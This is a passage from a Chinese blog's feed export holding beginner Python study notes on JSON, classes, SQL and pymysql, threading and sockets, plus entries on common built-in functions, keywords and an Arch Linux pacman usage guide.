title="四、json数据格式"></a>四、json数据格式</h2><ul><li>json是一种轻量级的数据交互格式，可以按照json指定的格式去组织和封装数据</li><li>json本质上是一个带有特定格式的<code>字符串</code></li></ul><p>主要功能：json就是一种在各个变成语言中通用的数据格式，负责不同编程语言中的数据传递和交互，类似于：</p><ul><li><p>国际通用语言-英语</p><p><strong>json格式的格式:</strong></p></li></ul><pre><code class="json">#json数据的格式可以是：&#123;&quot;name&quot;:&quot;admin&quot;,&quot;age&quot;:18&#125; #也可以是：[&#123;&quot;name&quot;:&quot;admin&quot;,&quot;age&quot;:18&#125;,&#123;&quot;name&quot;:&quot;root&quot;,&quot;age&quot;:16&#125;,&#123;&quot;name&quot;:&quot;alis&quot;,&quot;age&quot;:20&#125;]</code></pre><p>在线json网站(<a href="https://www.sojson.com/">sojson.com</a>)</p><h3 id="4-1、json格式数据转换"><a href="#4-1、json格式数据转换" class="headerlink" title="4.1、json格式数据转换"></a>4.1、json格式数据转换</h3><p><strong>Python数据和json数据的相互转换：</strong></p><pre><code class="python">#导入json模块import json# 准备符合格式json格式要求的python数据data=[&#123;&quot;name&quot;:&quot;admin&quot;,&quot;age&quot;:18&#125;,&#123;&quot;name&quot;:&quot;root&quot;,&quot;age&quot;:16&#125;]#通过json.dumps(data)方法把python数据转换为json数据data=json.dumps(data,ensure_ascii=False)#没有中文可以不带ensure_ascii=False#通过json.loads(data)方法把json数据转换为python数据data=json.loads(data)</code></pre><h2 id="五、面向对象"><a href="#五、面向对象" class="headerlink" title="五、面向对象"></a>五、面向对象</h2><p>面向对象编程，是许多编程语言都支持的一种编程思想。<br>简单理解是：基于模板(类)去创建实体(对象),使用对象完成功能开发。<br>面向对象的三大特性：</p><ul><li>封装</li><li>继承</li><li>多态</li></ul><h3 id="5-1、类和对象"><a href="#5-1、类和对象" class="headerlink" title="5.1、类和对象"></a>5.1、类和对象</h3><h4 id="5-1-1、类"><a href="#5-1-1、类" class="headerlink" title="5.1.1、类"></a>5.1.1、类</h4><ul><li>类相当于一个定义好模板的表格，用指定的模板来存储数据</li><li>类有两部分组成(成员变量,成员方法)<br>类的定义语法：</li></ul><pre><code class="python">class 类名称:    #类中的成员变量(属性)    name = None    age = None        #类中的成员方法(行为)    def say_hi(self)        print(f&quot;Hi,我是&#123;self.name&#125;&quot;)#输出:Hi,我是name</code></pre><p>如果将<code>类</code>带入到现实世界无非就是分为<code>事和物</code>，事和物又细分为<code>属性和行为</code></p><h4 id="5-1-2、类对象"><a href="#5-1-2、类对象" class="headerlink" title="5.1.2、类对象"></a>5.1.2、类对象</h4><p>类只是一种程序内的”设计图纸”，需要基于图纸生产(对象)，才能正常工作<code>(面向对象编程)</code></p><p>类对象的定义语法:</p><pre><code class="python">对象=类名称()</code></pre><h3 id="5-2、类的方法"><a href="#5-2、类的方法" class="headerlink" title="5.2、类的方法"></a>5.2、类的方法</h3><p>定义到类中的函数就叫方法</p><h4 id="5-2-1、成员方法"><a href="#5-2-1、成员方法" class="headerlink" title="5.2.1、成员方法"></a>5.2.1、成员方法</h4><p>成员方法的定义语法：</p><pre><code class="python">#在类中定义方法和定义函数基本一致，但仍有细微区别:def 方法名(self,形参1,,,,形参n):    方法体</code></pre><p>和函数区别多了一个self关键字,定义方法时候,<code>必须填写</code>的</p><ul><li>self表示类对象自身的意思</li><li>当使用类对象调用方法时，self会自动被python传入</li><li>在方法内部，想要访问类的成员变量，必须使用self(<code>self.成员变量</code>)</li></ul><p>成员方法调用：</p><pre><code class="python">user1=Student()#创建类对象user1.方法名(形参1,,,,形参n)#使用成员方法</code></pre><h4 id="5-5-2、魔术方法"><a href="#5-5-2、魔术方法" class="headerlink" title="5.5.2、魔术方法"></a>5.5.2、魔术方法</h4><h5 id="a、构造方法-init"><a href="#a、构造方法-init" class="headerlink" title="a、构造方法(init)"></a>a、构造方法(<strong>init</strong>)</h5><p>使用<code>__init__</code>方法，称之为构造方法。</p><ul><li>在创建类对象(构造类)的时候,<code>会自动执行</code>。</li><li>在创建类对象(构造类)的时候，<code>将自动传递给__init__方法使用</code></li></ul><p>构造方法的定义语法：</p><pre><code class="python">class Student:    age=None    name=None    tel=None    def __init__(self,name,age,tel):#构造方法定义        self.name = name#接收成员变量        self.age = age#接收成员变量        self.tel = tel#接收成员变量        print(&quot;自动执行&quot;)</code></pre><p>构造方法调用：</p><pre><code class="python">user1=Student(&quot;leo&quot;,&quot;18&quot;,&quot;123456789&quot;)#创建对象时直接传入成员变量，同时构造方法也会自动执行</code></pre><h5 id="b、字符串方法-str"><a href="#b、字符串方法-str" class="headerlink" title="b、字符串方法(str)"></a>b、字符串方法(<strong>str</strong>)</h5><p>使用<code>__str__</code>方法，称之为字符串方法。</p><ul><li>实现类对象转字符串的行为</li><li>可以str方法用在定制一个返回值给类对象</li></ul><pre><code class="python">class Student:    def __init__(self,name,age):#构造方法        self.name=name        self.age=age    def __str__(self):        return (f&quot;name:&#123;self.name&#125;,age&#123;self.age&#125;&quot;)#字符串方法，返回值给类对象user1 = Student(&quot;leo&quot;,&quot;18&quot;)#创建类对象，并赋值，同时将返回值给了user1print(user1)#输出name:leo,age18</code></pre><h3 id="5-3、封装"><a href="#5-3、封装" class="headerlink" title="5.3、封装"></a>5.3、封装</h3><blockquote><p>可以把封装描述为一种思想，将现实事物映射为程序思想</p></blockquote><p>封装表示的是，将现实世界事物的：</p><ul><li>属性</li><li>行为</li></ul><p>封装到类中，描述为：</p><ul><li>成员变量</li><li>成员方法</li></ul><h4 id="5-3-1、私有成员"><a href="#5-3-1、私有成员" class="headerlink" title="5.3.1、私有成员"></a>5.3.1、私有成员</h4><p>既然现实事物有不公开的属性和行为，那么作为现实事物在程序中映射的类，也应该支持<br>类中提供了两种私有成员：</p><ul><li>私有成员变量</li><li>私有成员方法</li></ul><p><code>私有成员不能被对象调用,但是类中其它成员可以访问</code></p><p>定义语法：<code>__变量名</code>和<code>__方法名</code>(两个下划线开头)<br>示例：</p><pre><code class="python">class Phone:    IMEI=None#序列号    producer=None#厂商        __current_voltage=None#当前电压(私有成员变量)        def __keep_single_core(self):#私有成员        print(&quot;让cpu以单核模式运行以节省电量&quot;)    </code></pre><blockquote><p>私有成员的意义：<br>在类中提供仅内部使用的属性和方法，而不对外开放(类对象无法使用)</p></blockquote><h3 id="5-4、继承"><a href="#5-4、继承" class="headerlink" title="5.4、继承"></a>5.4、继承</h3><p>继承就是一个类，继承另外一个类的成员变量和成员方法</p><h4 id="5-4-1、单继承和多继承："><a href="#5-4-1、单继承和多继承：" class="headerlink" title="5.4.1、单继承和多继承："></a>5.4.1、单继承和多继承：</h4><p><strong>单继承:</strong><br>继承一个父类的全部内容</p><pre><code class="python">class 类名(父类名):    新增类内容</code></pre><p><strong>多继承：</strong><br>继承多个父类的全部内容</p><pre><code class="python">class 类名(父类1,父类2...,父类n):    psss#表示留空不增加内容</code></pre><p>多继承注意事项：<br>如果父类中有同名成员方法和成员属性，先继承优先级高于后继承</p><h4 id="5-4-2、复写和调用父成员："><a href="#5-4-2、复写和调用父成员：" class="headerlink" title="5.4.2、复写和调用父成员："></a>5.4.2、复写和调用父成员：</h4><p><strong>复写：</strong><br>子类继承父类的成员属性和成员方法后，如对其”不满意“，可以进行复写。<br>语法即：<code>在子类中重新定义同名的属性或方法即可。</code></p><p><strong>调用:</strong><br>在子类中调用父类成员<br>方式一：</p><blockquote><p>调用父类成员<br>调用成员变量：父类名.成员变量<br>调用成员方法：父类名.成员方法(self)</p></blockquote><p>方式二：</p><blockquote><p>使用super()调用父类成员<br>调用成员变量：super().成员变量<br>调用成员方法：super.成员方法()</p></blockquote><p>注意事项：只可以在子类内部调用同名的同类成员,子类的实体类调用默认是调用子类复写的</p><h3 id="5-5、多态"><a href="#5-5、多态" class="headerlink" title="5.5、多态"></a>5.5、多态</h3><p>多态，指的是：多种状态，即完成某个行为时，使用不同对象会得到不同的状态</p><h3 id="5-6、类型注解"><a href="#5-6、类型注解" class="headerlink" title="5.6、类型注解"></a>5.6、类型注解</h3><p>在代码中涉及数据交互的地方，提供类型的注解(显示的说明)。<br>主要功能：</p><ul><li>帮助第三方IDE对代码进行类型推断，协助做代码提示</li><li>帮助开发者自身对变量进行类型注释</li></ul><p>支持：</p><ul><li>变量的类型注解</li><li>函数(方法)形参列表和返回值的类型注解</li></ul><h4 id="5-6-1、变量的类型注解"><a href="#5-6-1、变量的类型注解" class="headerlink" title="5.6.1、变量的类型注解"></a>5.6.1、变量的类型注解</h4><p>基础语法：<code>变量:类型</code></p><h4 id="5-6-2、函数-方法-的类型注解"><a href="#5-6-2、函数-方法-的类型注解" class="headerlink" title="5.6.2、函数(方法)的类型注解"></a>5.6.2、函数(方法)的类型注解</h4><pre><code class="Python">def 函数方法名(形参:类型,,,形参:类型)-&gt;返回值类型:    pass</code></pre><h4 id="5-6-3、Union类型"><a href="#5-6-3、Union类型" class="headerlink" title="5.6.3、Union类型"></a>5.6.3、Union类型</h4><p>Union可以定义联合类型注释</p><pre><code class="python">from typing import UnionUnion[类型,...类型]</code></pre><h2 id="六、数据库-SQL"><a href="#六、数据库-SQL" class="headerlink" title="六、数据库(SQL)"></a>六、数据库(SQL)</h2><h3 id="6-1、mysql的基本使用"><a href="#6-1、mysql的基本使用" class="headerlink" title="6.1、mysql的基本使用"></a>6.1、mysql的基本使用</h3><p>Windows版mysql的安装：<a href="https://downloads.mysql.com/archives/installer/">下载链接</a><br>图形化sql操作软件(DBeaver)：<a href="https://dbeaver.io/download">下载链接</a></p><p><strong>SQL语言的分类</strong><br>由于数据库管理系统(数据库软件)功能非常多，不仅仅是存储数据,还要包含：数据的管理、表的管理、库的管理、账户的管理、权限管理等。<br>所以，操作数据库的SQL语言，也基于功能，可以分为四类:</p><ul><li>1.数据定义：DDL(Data Definition Language)<ul><li>库的创建删除、表的创建删除</li></ul></li><li>2.数据操作：DML(DataManipulation Language)<ul><li>新增数据、删除数据、修改数据等</li></ul></li><li>3.数据控制：DCL(Data Control Language)<ul><li>新增用户、删除用户、密码修改、权限管理等</li></ul></li><li>4.数据查询：DQL(Data Query Language)<ul><li>基于需求查询和计算数据</li></ul></li></ul><p><strong>SQL的语法特征</strong></p><ul><li>SQL语法，大小写不敏感</li><li>SQL可以单行或多行书写，最后以<code>;</code>号结束</li><li>SQL支持注释：<ul><li>单行注释：– 注释内容(– 后面要有空格)</li><li>单行注释：# 注释内容(# 后面可以不加空格，推荐加上)</li><li>多行注释：&#x2F;* 注释内容 *&#x2F;</li></ul></li></ul><p>命令行环境基础操作</p><pre><code class="sql">#登录mysql -uroot -p#查看有哪些数据库show databases;#使用某个数据库use 数据库名#查看数据内有哪些表show tables #退出mysql命令行环境exit</code></pre><h4 id="6-1-1、DDL-库、表操作"><a href="#6-1-1、DDL-库、表操作" class="headerlink" title="6.1.1、DDL(库、表操作)"></a>6.1.1、DDL(库、表操作)</h4><p><strong>库操作</strong><br>查看有哪些数据库<br><code>show databases;</code><br>使用数据库<br><code>use 数据库名称</code><br>创建数据库<br><code>create database 数据库名称 charset utf8;</code><br>删除数据库<br><code>drop database 数据库名称;</code><br>查看当前是使用的数据库<br><code>select database();</code></p><p><strong>表操作</strong><br>查看有哪些表（需要先选择数据库）<br><code>show tables;</code><br>删除表<br><code>drop table 表名称;</code><br><code>drop table if exists 表名称;</code><br>创建表</p><pre><code class="sql">create table 表名称(    列名称 列类型,    列名称 列类型):/*列类型有int-- 整数float-- 浮点型varchar(长度)   --文本，长度为数字，做最大长度限制date-- 日期类型timestamp-- 时间戳类型*/</code></pre><h4 id="6-1-2、DML-数据操作"><a href="#6-1-2、DML-数据操作" class="headerlink" title="6.1.2、DML(数据操作)"></a>6.1.2、DML(数据操作)</h4><p>DML是指数据操作语言，英文全程是Data Manipulation Language ，用来对数据库表中记录进行更新。插入<code>insert</code>   删除<code>delete</code>   更新<code>update</code></p><p><strong>数据插入 insert</strong><br>基础语法：<code>insert into 表[(列1,列2,....列n)] values(值1,值2,....值n),(值1,值2,....值n)...,(值1,值2,....值n)</code><br>示例:</p><pre><code class="sql"># 创建表create table test_table(    ID int,    name varchar(20),    age int);# 仅插入id列数据insert into test_table(ID) values(10001),(10002),(10003);# 插入全部列数据insert into test_table(ID,name,age) values(10001,&quot;周杰伦&quot;,31),(10002,&quot;王力宏&quot;,33),(10003,&quot;林俊杰&quot;,26);# 插入全部列数据，快捷写法insert into test_table values(10001,&quot;周杰伦&quot;,31),(10002,&quot;王力宏&quot;,33),(10003,&quot;林俊杰&quot;,26);</code></pre><p><strong>数据删除 delete</strong><br>删除行<br>基础语法 ：<code>delete from 表 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 删除name为王五的数据delete from test_table where name=&quot;王五&quot;# 删除ID&gt;=10005的数据delete from test_table where ID&gt;=10005</code></pre><p><strong>数据更新 update</strong><br>基础语法：<code>update 表 set 列=值 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 修改age列的全部数据为30update test_table set age=30# 修改ID为10004的name为李四update test_table set name=&quot;李四&quot; where ID=10004</code></pre><h4 id="6-1-3、DQL-数据查询"><a href="#6-1-3、DQL-数据查询" class="headerlink" title="6.1.3、DQL(数据查询)"></a>6.1.3、DQL(数据查询)</h4><p><strong>基础查询</strong><br>基础语法：<code>select 列 from 表 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 查询全部数据select * from test_table; # 查询id，name列中age=25的数据select ID,name from test_table where age=25;</code></pre><p><strong>排序分页</strong><br>排序基础语法：<code>select 列 from 表 [where 条件判断] order by 列 [asc|desc];</code><br>(order by 列，以这里的列为排序对象，asc为升序，desc为降序)<br>分页基础语法：<code>select 列 from 表 [where 条件判断] limit 显示数量;</code><br>排序分页嵌套：<code>select 列 from 表 [where 条件判断] order by 列 [asc|desc] limit 显示数量;</code></p><h3 id="6-2、pymysql模块"><a href="#6-2、pymysql模块" class="headerlink" title="6.2、pymysql模块"></a>6.2、pymysql模块</h3><p>在python中，使用第三方库：<code>pymysql</code>来完成对mysql数据库的操作<br>安装：<code>pip install mysql</code></p><h4 id="6-2-1、创建mysql数据库连接"><a href="#6-2-1、创建mysql数据库连接" class="headerlink" title="6.2.1、创建mysql数据库连接"></a>6.2.1、创建mysql数据库连接</h4><ul><li>创建连接对象&#x3D;Connection(数据库信息)</li></ul><pre><code class="python"># 创建mysql数据库连接from pymysql import Connection  #导包# 获取到mysql数据库的连接对象conn = Connection(    host=&#39;localhost&#39;,   #主机名(或ip)    port=3306,          #端口    user=&#39;root&#39;,        #账户名    password=&#39;123456&#39;   #密码)# 打印mysql数据库软件信息print(conn.get_server_info())#关闭数据库连接conn.close()</code></pre><h4 id="6-2-2、执行sql语句-查询"><a href="#6-2-2、执行sql语句-查询" class="headerlink" title="6.2.2、执行sql语句-查询"></a>6.2.2、执行sql语句-查询</h4><ul><li>创建游标&#x3D;连接对象.cursor() #创建游标对象,使用游标操作数据库，</li><li>游标对象.execute(“执行语句”)#使用游标对象执行数据库</li><li>游标对象.fetchall() #接收数据以元组的形式显示</li></ul><pre><code class="python"># 创建mysql数据库连接from pymysql import Connection  #导包# 获取到mysql数据库的连接对象conn = Connection(    host=&#39;localhost&#39;,   #主机名(或ip)    port=3306,          #端口    user=&#39;root&#39;,        #账户名    password=&#39;123456&#39;   #密码)cursor = conn.cursor()# 创建游标对象conn.select_db(&quot;test&quot;)#选择数据库cursor.execute(&quot;select * from test_table;&quot;)#使用游标对象执行sql查询语句results=cursor.fetchall()   #使用游标接收显示数据print(results)#打印数据conn.close()#关闭数据库连接</code></pre><h4 id="6-2-3、执行sql语句-插入"><a href="#6-2-3、执行sql语句-插入" class="headerlink" title="6.2.3、执行sql语句-插入"></a>6.2.3、执行sql语句-插入</h4><ul><li>pymysql在执行数据插入或其它产生数据更改sql语句是，默认是需要确认的。</li><li>手动提交更改可以通过<code>连接对象.commit()</code></li><li>或者使用自动提交更改，在创建连接对象中添加<code>autocommit=True</code></li></ul><p>示例：</p><pre><code class="python"># 创建mysql数据库连接from pymysql import Connection  #导包# 获取到mysql数据库的连接对象conn = Connection(    host=&#39;localhost&#39;,   #主机名(或ip)    port=3306,          #端口    user=&#39;root&#39;,        #账户名    password=&#39;123456&#39;,   #密码    autocommit=True     #自动提交更改(和连接对象.commit()效果一样))cursor = conn.cursor()# 创建游标对象conn.select_db(&quot;test&quot;)#选择数据库cursor.execute(&quot;insert into test_table values(10004,&#39;leo&#39;,21)&quot;)#使用游标对象执行sql查询语句#conn.commit()               #手动提交更改conn.close()#关闭数据库连接</code></pre><h2 id="七、多线程编程"><a href="#七、多线程编程" class="headerlink" title="七、多线程编程"></a>七、多线程编程</h2><ul><li>多个进程同时在运行，即不同的程序同时运行，称之为：多任务并行执行</li><li>一个进程内的多个线程同时在运行，称之为：多线程并行执行</li></ul><h3 id="7-1、threading模块"><a href="#7-1、threading模块" class="headerlink" title="7.1、threading模块"></a>7.1、threading模块</h3><p>python多线程可以通过<code>threading</code>内置模块来实现<br>语法：</p><pre><code class="python">import threading#导入包线程对象1=threading.Thread(target=函数)#创建线程1线程对象2=threading.Thread(target=函数,args=(&quot;函数的参数&quot;,))#创建线程2线程对象1.start()#启动多线程任务线程对象2.start()#启动多线程任务</code></pre><p>注意事项：</p><ul><li>函数的参数写到args&#x3D;(“参数”,)元组里面，组后不要忘记加<code>,</code></li></ul><p>示例：</p><pre><code class="python">#threading模块多线程示例import timeimport threadingdef work(name):             #创建一个函数    for x in range(5):        time.sleep(1)        print(f&quot;我是&#123;name&#125;,&#123;x&#125;&quot;)#创建线程一work_threa1=threading.Thread(target=work,args=(&quot;tom&quot;,))#创建线程二work_threa2=threading.Thread(target=work,args=(&quot;alis&quot;,))#启动线程任务work_threa1.start()work_threa2.start()</code></pre><h2 id="八、网络编程"><a href="#八、网络编程" class="headerlink" title="八、网络编程"></a>八、网络编程</h2><p>socket(简称：套接字)是进程之间通信的一个工具，负责进程之间网络数据传输，好比数据的搬运工<br><strong>客户端和服务端</strong></p><ul><li>两个进程之间通过Socket进行相互通讯，就必须有服务端和客户端</li><li>Socket服务端：等待其它进程的连接、可接受发来的消息、可以回复消息(被动)</li><li>Socket客户端：主动连接服务端、可以发送消息、可以接收回复(主动)</li></ul><h3 id="8-1、Socket服务端编程"><a href="#8-1、Socket服务端编程" class="headerlink" title="8.1、Socket服务端编程"></a>8.1、Socket服务端编程</h3><p>创建Socket服务端步骤：</p><pre><code class="python"># 1.创建Socket对象import socketsocket_server = socket.socket()# 2.绑定socket_server到指定ip和端口(元组)socket_server.bind((&quot;0.0.0.0&quot;,7777))# 3. 服务端开始监听端口## listen()里面可以填写int类型的整数，表示允许连接的数量，超出的会等待，不填的话会自动分配socket_server.listen()# 4.接收客户端连接，获得连接对象conn,address = socket_server.accept()## accept方法是一个阻塞方法，如果没有连接，会卡在这一行代码## accept返回的是一个二元元组，用两个变量接收2个元素## address是客户端地址,conn是消息传输对象用来发送和接收消息print(f&quot;接收到客户端连接，地址为&#123;address&#125;&quot;)# 5.客户端连接后，通过recv方法，接收客户端发送的消息client_data = conn.recv(1024).decode(&quot;UTF-8&quot;)## recv方法返回值是字节,通过decode方法使用UTF-8的编码转换为字符串## recv的传参是buffsize，缓冲区大小，一般设置为1024print(client_data)# 6.通过send方法回复客户端消息conn.send(&quot;我已收到你的连接!&quot;.encode(&quot;UTF-8&quot;))## encode方法将字符串转换为二进制# 7.关闭连接conn.close()socket_server.close()</code></pre><h3 id="8-1、Socket客户端编程"><a href="#8-1、Socket客户端编程" class="headerlink" title="8.1、Socket客户端编程"></a>8.1、Socket客户端编程</h3><p>Socket客户端创建步骤：</p><pre><code class="python"># 1.创建sokcet对象import socketsocket_client = socket.socket()# 2.连接到服务端(ip端口为元组)socket_client.connect((&quot;localhost&quot;,8888))# 3. 发送消息socket_client.send(&quot;hello my is client&quot;.encode(&quot;UTF-8&quot;))# 4. 接收消息server_data = socket_client.recv(1024).decode(&quot;UTF-8&quot;)print(server_data)# 5.关闭连接socket_client.close()</code></pre><p>注意事项：</p><ul><li>死循环后的close方法不可执行</li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python常用函数使用</title>
      <link href="/2024/05/20/%E5%BC%80%E5%8F%91/Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/05/20/%E5%BC%80%E5%8F%91/Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="1、print—输出内容"><a href="#1、print—输出内容" class="headerlink" title="1、print—输出内容"></a>1、print—输出内容</h2><p> <strong>输出不换行</strong><br>加上and&#x3D;’’</p><pre><code class="python">print(&quot;hello&quot;,and=&#39;&#39;)print(&quot;word&quot;,and=&#39;&#39;)</code></pre><h2 id="2、len—统计字符串长度"><a href="#2、len—统计字符串长度" class="headerlink" title="2、len—统计字符串长度"></a>2、len—统计字符串长度</h2><p>用来统计字符串长度</p><pre><code class="python">name = &quot;tanglx&quot;print(f&quot;长度为：&#123;len(name)&#125;&quot;)</code></pre><h2 id="3-type—识别变量类型"><a href="#3-type—识别变量类型" class="headerlink" title="3. type—识别变量类型"></a>3. type—识别变量类型</h2><p>打印识别变量类型</p><p>例题：</p><pre><code class="routeros">name=&#39;汤龙祥&#39;Age=18Height=1.75print(type(name))print(type(Age))print(type(Height))</code></pre><h2 id="4-range—获得一个数字序列"><a href="#4-range—获得一个数字序列" class="headerlink" title="4. range—获得一个数字序列"></a>4. range—获得一个数字序列</h2><p>range语句的功能是：</p><ul><li>获得一个数字序列</li></ul><p>语法：<br>语法1：</p><pre><code class="maxima">range(num)# 从0开始，到num结束(不含num本身)</code></pre><p>语法2：</p><pre><code class="stylus">range(num1,num2)# 从num1开始，到num2结束(不含num2本身)</code></pre><p>语法3：</p><pre><code class="maxima">range(num1,num2,step)# 从num1开始，到num2结束,step为步长</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础关键字</title>
      <link href="/2024/05/08/%E5%BC%80%E5%8F%91/%E5%9F%BA%E7%A1%80%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2024/05/08/%E5%BC%80%E5%8F%91/%E5%9F%BA%E7%A1%80%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p><strong>Python中的关键字有</strong></p><pre><code class="ruby">&#39;false&#39;, &#39;none&#39;, &#39;true&#39;, &#39;and&#39;, &#39;as&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;continue&#39;, &#39;def&#39;, &#39;del&#39;, &#39;elif&#39;, &#39;else&#39;, &#39;except&#39;, &#39;finally&#39;, &#39;for&#39;, &#39;from&#39;, &#39;global&#39;, &#39;if&#39;, &#39;import&#39;, &#39;in&#39;, &#39;is&#39;, &#39;lambda&#39;, &#39;nonlocal&#39;, &#39;not&#39;, &#39;or&#39;, &#39;pass&#39;, &#39;raise&#39;, &#39;return&#39;, &#39;try&#39;, &#39;while&#39;, &#39;with&#39;, &#39;yield&#39;</code></pre><h2 id="1、global—声明全局变量"><a href="#1、global—声明全局变量" class="headerlink" title="1、global—声明全局变量"></a>1、global—声明全局变量</h2><p>函数体内修改全局变量在函数外不会生效，可以使用global在函数体内声明为全局变量</p><pre><code class="python">num = 100def testA():    global num#global声明    num = 200    print(&quot;函数体内num=&quot;,num)testA()print(&quot;函数体外num=&quot;,num)</code></pre><h2 id="2、not、and、or—逻辑运算符"><a href="#2、not、and、or—逻辑运算符" class="headerlink" title="2、not、and、or—逻辑运算符"></a>2、not、and、or—逻辑运算符</h2><p>not、and、or为逻辑运算符</p><table><thead><tr><th>运算符</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>not</td><td>非</td><td>相当于“反义词”</td></tr><tr><td>and</td><td>和</td><td>条件同时为真，才可以是真</td></tr><tr><td>or</td><td>或</td><td>条件有一个为真，结果就为真</td></tr><tr><td>三个逻辑运算符的优先级为：</td><td></td><td></td></tr></tbody></table><pre><code class="python">not &gt; and &gt; or</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pacman包管理器</title>
      <link href="/2024/04/25/linux/pacman%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"/>
      <url>/2024/04/25/linux/pacman%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、pacman包管理器用法"><a href="#一、pacman包管理器用法" class="headerlink" title="一、pacman包管理器用法"></a>一、pacman包管理器用法</h1><table data-draft-node="block" data-draft-type="table" data-size="normal" data-row-style="normal"><tbody><tr><th>功能</th><th>命令</th></tr><tr><td>安装软件包（组）</td><td># pacman -S 软件包（组）名</td></tr><tr><td>移除软件包</td><td># pacman -R 软件包名</td></tr><tr><td>移除软件包及其未被其他软件包要求的依赖</td><td># pacman -Rs 软件包名</td></tr><tr><td>同步软件数据库并更新系统</td><td># pacman -Syu</td></tr><tr><td>查询软件数据库</td><td>$ pacman -Ss 字符串</td></tr><tr><td>查询文件</td><td># pacman -F 字符串</td></tr></tbody></table><h2 id="1、软件包缓存清理"><a href="#1、软件包缓存清理" class="headerlink" title="1、软件包缓存清理"></a>1、软件包缓存清理</h2><p>使用 pacman 安装和更新软件包时，软件包会下载到 &#x2F;var&#x2F;cache&#x2F;pacman&#x2F;pkg&#x2F; 目录下。久而久之，缓存会占据大量的存储空间。因此，定期清理软件包缓存是必要的。</p><p>请安装 pacman-contrib 软件包，然后开机自动启动 paccache.timer，以便每周自动清理不使用的软件包缓存。</p><pre><code class="shell"># pacman -S pacman-contrib# systemctl enable paccache.timer</code></pre><h2 id="2、pacman-的使用注意事项"><a href="#2、pacman-的使用注意事项" class="headerlink" title="2、pacman 的使用注意事项"></a>2、pacman 的使用注意事项</h2><p>软件包管理是系统维护的一部分。作为管理员，使用计算机的时候一定要负起系统管理员的责任。如果您热爱 Linux 的开放与可定制性，就要有能力遵守 Linux 的维护规则，以免破坏系统。</p><p>使用 pacman 的注意事项如下：</p><ul><li>更新系统前作好准备</li><li>禁止部分更新</li><li>注意更新时的提醒</li><li>定期检查孤立包</li></ul><h3 id="2-1更新系统前作好准备"><a href="#2-1更新系统前作好准备" class="headerlink" title="2.1更新系统前作好准备"></a>2.1更新系统前作好准备</h3><p>我们已经知道，在 Arch Linux 中，系统更新的命令是 pacman -Syu。绝大多数情况下，pacman 可以帮您处理好一切事务，但也有例外。当系统更新无法自动完成，需要用户手动干预时，Arch Linux 主页会定期发布新闻，提供系统更新指南。</p><p>笔者建议您在系统更新之前，前往 Arch Linux 主页 查看最新消息。如果更新需要不寻常的用户操作介入时（无法简单地按照 pacman 的输出信息处理），以上信息总会给出合适的方法。</p><p>此外，有时重要软件包更新时，会引发一些严重的问题，俗称“滚炸了”。查看 Arch Linux 相关论坛和群组，有助于避免这些问题。笔者推荐的论坛和群组如下：</p><ul><li data-pid="OwUakM3t"><a href="https://link.zhihu.com/?target=https%3A//bbs.archlinux.org/" class=" wrap external" target="_blank" rel="nofollow noreferrer" data-za-detail-view-id="1043">Arch Linux 论坛</a></li><li data-pid="Gg4dXLEa"><a href="https://link.zhihu.com/?target=https%3A//bbs.archlinuxcn.org/" class=" wrap external" target="_blank" rel="nofollow noreferrer" data-za-detail-view-id="1043">Arch Linux 中文论坛</a></li><li data-pid="4Yilo-BB"><a href="https://link.zhihu.com/?target=https%3A//www.archlinuxcn.org/archlinuxcn-group-mailling-list/" class=" wrap external" target="_blank" rel="nofollow noreferrer" data-za-detail-view-id="1043">Arch Linux 中文社区交流群</a></li></ul>最后，系统更新出现问题是难以避免的。因此，请不要在重要任务前进行系统更新，而是留出足够的时间用于应付可能的问题。<h3 id="2-2禁止部分更新"><a href="#2-2禁止部分更新" class="headerlink" title="2.2禁止部分更新"></a>2.2禁止部分更新</h3><p><code>pacman -Sy</code> 命令用于下载软件包数据库，但不更新系统中的软件包。这种操作就称为“部分更新”。部分更新是危险的。当您下载软件包数据库（<code>pacman -Sy</code>）之后，如果安装新软件（<code>pacman -S</code>），可能造成依赖关系被破坏。</p><p>很简单，请记住一点：</p><p>不要使用 <code>pacman -Sy</code>，而是使用 <code>pacman -Syu</code>。</p><h3 id="2-3注意更新时的提醒"><a href="#2-3注意更新时的提醒" class="headerlink" title="2.3注意更新时的提醒"></a>2.3注意更新时的提醒</h3><p>当升级系统时， 请一定要注意 pacman 输出的注意信息。 如果有需要用户手动操作的，请一定要立即搞定。 如果不明白 pacman 输出的信息， 请去论坛搜索或者看 Arch Linux 首页的新闻。</p><p>当配置文件发生更新，或者卸载软件包的时候，pacman 可能会生成 pacnew 和 pacsave 文件。这些文件可以用 pacdiff 处理。</p><pre><code class="shell"># pacdiff  # 处理 pacnew 和 pacsave 文件</code></pre><h3 id="2-4定期检查孤立包"><a href="#2-4定期检查孤立包" class="headerlink" title="2.4定期检查孤立包"></a>2.4定期检查孤立包</h3><p>更新系统后，有些软件包不再作为依赖，或者不再属于官方仓库。您可以定期用以下命令清除或查看它们</p><pre><code class="shell"># pacman -Qtdq | pacman -Rns -  # 递归删除孤立软件包及其配置文件$ pacman -Qqd | pacman -Rsu --print - 